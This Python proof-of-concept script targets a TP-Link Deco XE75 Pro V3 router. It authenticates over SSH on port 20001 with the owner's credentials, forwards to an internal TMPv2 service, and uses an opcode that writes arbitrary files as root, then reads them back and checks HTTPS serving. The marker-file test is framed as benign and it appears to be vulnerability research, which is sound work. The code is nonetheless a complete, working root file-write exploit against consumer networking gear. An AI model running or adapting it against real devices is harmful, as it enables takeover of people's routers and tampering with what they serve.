#!/usr/bin/env python3
"""
Deco XE75 Pro V3 — owner-authenticated debug channel: arbitrary root file write.

Self-contained proof of concept (no project imports).

Path:
  SSH :20001 (Dropbear, direct-tcpip forwarding only, password auth)
    -> 127.0.0.1:20002 (TMPv2 / tmpsvr)
       -> opcode 0xC456 (inner_file_push): io.open(params.file,"w") + verbatim write,
          as UID 0, no path allowlist
       -> opcode 0x00F0 (root file read): byte-exact readback

Verified on: TP-Link Deco XE75 Pro V3, firmware 1.5.0 Build 20260603 Rel.15804.

Credentials: owner TP-Link account.
  username = SHA1(exact owner email)
  password = owner TP-Link account password
Set DECO_EMAIL / DECO_PASSWORD env vars (never written to disk by this script).
DECO_HOST (default 192.168.68.1), DECO_PORT (default 20001).
Optional: DECO_HOSTKEY = base64 host key (ssh-keyscan format) to pin the server key.

Usage:
  python3 deco_filepush_poc.py --selftest          # offline: framing sanity only
  python3 deco_filepush_poc.py --run               # live: write marker, readback, HTTPS check
  python3 deco_filepush_poc.py --cleanup <nonce>   # live: overwrite marker with empty content

Non-destructive: writes one marker to /www/log_export (ramfs, gone on reboot),
verifies byte-exact readback and unmodified HTTPS serving.
"""
import argparse
import hashlib
import json
import os
import socket
import ssl
import struct
import sys
import time
import urllib.request
import uuid
import zlib

try:
    import paramiko
except ImportError:
    paramiko = None

HOST = os.environ.get("DECO_HOST", "192.168.68.1")
PORT = int(os.environ.get("DECO_PORT", "20001"))
FORWARD_DEST = ("127.0.0.1", 20002)
FILE_PUSH = 0xC456
READ_FILE = 0x00F0
DIRECTORY = "/www/log_export"
REQUEST_SECONDS = 15
MAX_RESPONSE = 128 * 1024

# ---------------------------------------------------------------- TMPv2 framing
# Protocol framing derived offline from the release libtmpv2 (CRC32-checked).
OUTER = struct.Struct("!BBBBHBBII")
BUSINESS = struct.Struct("!BBHBBHIII")
CHECKSUM_PLACEHOLDER = 0x5A6B7C8D


def tpacket(opcode, sequence, flag, payload=b"", total=None, payload_crc=None, offset=0):
    if flag not in (2, 3, 4, 5):
        raise ValueError("Unsupported business flag")
    if not isinstance(payload, bytes) or len(payload) > 8156:
        raise ValueError("Invalid payload")
    if total is None:
        total = len(payload)
    if payload_crc is None:
        payload_crc = zlib.crc32(payload)
    inner = BUSINESS.pack(1, 2, opcode, flag, 0, sequence, payload_crc, total, offset)
    outer = OUTER.pack(1, 1, 5, 0, len(inner) + len(payload), 0, 0, 0, CHECKSUM_PLACEHOLDER)
    frame = bytearray(outer + inner + payload)
    struct.pack_into("!I", frame, 12, zlib.crc32(frame))
    return bytes(frame)


def tpull(opcode, sequence, offset=0):
    return tpacket(opcode, sequence, 4, offset=offset)


def tparse(frame):
    if len(frame) < 36:
        raise ValueError("Truncated business frame")
    major, minor, typ, reserved, size, flags, error, outer_seq, checksum = OUTER.unpack_from(frame)
    if (major, minor, typ, reserved, flags, error) != (1, 1, 5, 0, 0, 0):
        raise ValueError("Unexpected outer header")
    if size != len(frame) - 16 or not 20 <= size <= 8176:
        raise ValueError("Invalid frame length")
    checked = bytearray(frame)
    struct.pack_into("!I", checked, 12, CHECKSUM_PLACEHOLDER)
    if zlib.crc32(checked) != checksum:
        raise ValueError("Frame CRC mismatch")
    version, subtype, opcode, flag, reserved2, sequence, payload_crc, total, offset = \
        BUSINESS.unpack_from(frame, 16)
    if (version, subtype, reserved2) != (1, 2, 0):
        raise ValueError("Unexpected business header")
    return dict(opcode=opcode, flag=flag, sequence=sequence, payload_crc=payload_crc,
                total=total, offset=offset, payload=frame[36:])


# ------------------------------------------------------------------- transport
def send(chan, data, deadline):
    remaining = deadline - time.monotonic()
    if remaining <= 0:
        raise TimeoutError("deadline")
    chan.settimeout(remaining)
    chan.sendall(data)


def receive_exact(chan, n, deadline):
    buf = bytearray()
    while len(buf) < n:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            raise TimeoutError("deadline")
        chan.settimeout(remaining)
        chunk = chan.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("channel closed")
        buf.extend(chunk)
    return bytes(buf)


class Session:
    def __init__(self, channel):
        self.channel = channel
        self.sequence = 0

    def associate(self):
        deadline = time.monotonic() + REQUEST_SECONDS
        send(self.channel, bytes.fromhex("01010100"), deadline)
        if receive_exact(self.channel, 4, deadline) != bytes.fromhex("01010200"):
            raise ValueError("Unexpected association reply")
        send(self.channel, bytes.fromhex("01010200"), deadline)
        token = self._exchange(1, b"")
        if len(token) != 32:
            raise ValueError("Unexpected token length")

    def _exchange(self, opcode, payload):
        self.sequence += 1
        sequence = self.sequence
        deadline = time.monotonic() + REQUEST_SECONDS
        send(self.channel, tpacket(opcode, sequence, 2, payload), deadline)
        assembled = bytearray()
        while True:
            header = receive_exact(self.channel, 16, deadline)
            size = int.from_bytes(header[4:6], "big")
            if not 20 <= size <= 8176:
                raise ValueError("Invalid frame size")
            reply = tparse(header + receive_exact(self.channel, size, deadline))
            if reply["opcode"] != opcode or reply["sequence"] != sequence:
                raise ValueError("Response mismatch")
            if reply["flag"] == 3:  # PUSH_ACK: poll
                time.sleep(0.05)
                send(self.channel, tpull(opcode, sequence, len(assembled)), deadline)
                continue
            if reply["flag"] != 5 or reply["offset"] != len(assembled):
                raise ValueError("Unexpected fragment")
            if reply["total"] > MAX_RESPONSE:
                raise ValueError("Response too large")
            assembled.extend(reply["payload"])
            if len(assembled) == reply["total"]:
                if zlib.crc32(assembled) != reply["payload_crc"]:
                    raise ValueError("Payload CRC mismatch")
                return bytes(assembled)
            send(self.channel, tpull(opcode, sequence, len(assembled)), deadline)

    def push_file(self, path, content):
        req = json.dumps({"params": {"file": path, "content": content}}, separators=(",", ":"))
        raw = self._exchange(FILE_PUSH, req.encode())
        return json.loads(raw.decode("latin-1"))

    def read_file(self, path):
        req = json.dumps({"params": {"file": path}}, separators=(",", ":"))
        raw = self._exchange(READ_FILE, req.encode()).decode("latin-1")
        resp = json.loads(raw)
        if resp.get("error_code") != 0:
            raise ValueError("File read not reported successful: %r" % resp)
        return resp["result"]["data"].encode("latin-1")


def connect(email, password, hostkey_b64=None):
    sock = socket.create_connection((HOST, PORT), timeout=5)
    transport = paramiko.Transport(sock)
    transport.start_client(timeout=5)
    if hostkey_b64:
        import base64
        actual_b64 = base64.b64encode(transport.get_remote_server_key().asbytes()).decode("ascii")
        expected_b64 = hostkey_b64.strip().split()[-1]
        if actual_b64 != expected_b64:
            raise ValueError("Host key mismatch (TOFU pin failed)")
    username = hashlib.sha1(email.encode()).hexdigest()
    transport.auth_timeout = 10
    transport.auth_password(username, password, fallback=False)
    channel = transport.open_channel("direct-tcpip", FORWARD_DEST, ("127.0.0.1", 0), timeout=5)
    return transport, channel


def selftest():
    # offline sanity: framing round-trips through our own parser
    p = tpacket(1, 1, 2)
    r = tparse(p)
    assert r["opcode"] == 1 and r["flag"] == 2 and r["total"] == 0
    p2 = tpacket(FILE_PUSH, 2, 2, b'{"params":{"file":"/tmp/x","content":"y"}}')
    r2 = tparse(p2)
    assert r2["opcode"] == FILE_PUSH and r2["payload"].startswith(b'{"params"')
    print("selftest OK: framing round-trip passes (offline, no device contact)")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--selftest", action="store_true")
    ap.add_argument("--run", action="store_true")
    ap.add_argument("--cleanup", metavar="NONCE")
    args = ap.parse_args()

    if args.selftest:
        selftest()
        return

    if paramiko is None:
        sys.exit("paramiko required: pip install paramiko")
    email = os.environ.get("DECO_EMAIL")
    password = os.environ.get("DECO_PASSWORD")
    if not email or email != email.strip():
        sys.exit("DECO_EMAIL must be set (exact owner email, no surrounding spaces)")
    if not password:
        sys.exit("DECO_PASSWORD must be set")
    hostkey = os.environ.get("DECO_HOSTKEY")  # optional ssh-keyscan key line value

    if args.cleanup:
        nonce = args.cleanup
    else:
        nonce = uuid.uuid4().hex

    marker = DIRECTORY + "/deco-write-" + nonce + ".html"
    content = (
        "<!doctype html><html><head><meta charset=utf-8>"
        "<title>Deco write check</title></head><body>"
        "<h1>Deco XE75 Pro write check</h1>"
        "<p>Owner-authorized write probe, served from /www/log_export.</p>"
        "<p>nonce: " + nonce + "</p>"
        "</body></html>"
    )
    if args.cleanup:
        content = ""  # empty overwrite; marker path is ramfs, also gone on reboot

    receipt = {
        "host": HOST, "remote_path": marker, "nonce": nonce,
        "transfer_reported_success": None, "readback_exact": None,
        "https_served_exact": None, "cleanup": "marker is ramfs (/www/log_export); reboot also removes it",
    }
    transport = None
    try:
        transport, channel = connect(email, password, hostkey)
        session = Session(channel)
        session.associate()
        reply = session.push_file(marker, content)
        receipt["transfer_reported_success"] = reply.get("error_code") == 0
        got = session.read_file(marker)
        receipt["readback_exact"] = got == content.encode("utf-8")
        if not args.cleanup and receipt["readback_exact"]:
            url = "https://%s/log_export/deco-write-%s.html" % (HOST, nonce)
            ctx = ssl._create_unverified_context()
            with urllib.request.urlopen(url, timeout=10, context=ctx) as r:
                served = r.read()
            receipt["https_served_exact"] = (r.status == 200) and (served == content.encode("utf-8"))
            receipt["https_status"] = r.status
    finally:
        if transport is not None:
            transport.close()
    receipt["utc"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    print(json.dumps(receipt, indent=2))


if __name__ == "__main__":
    main()
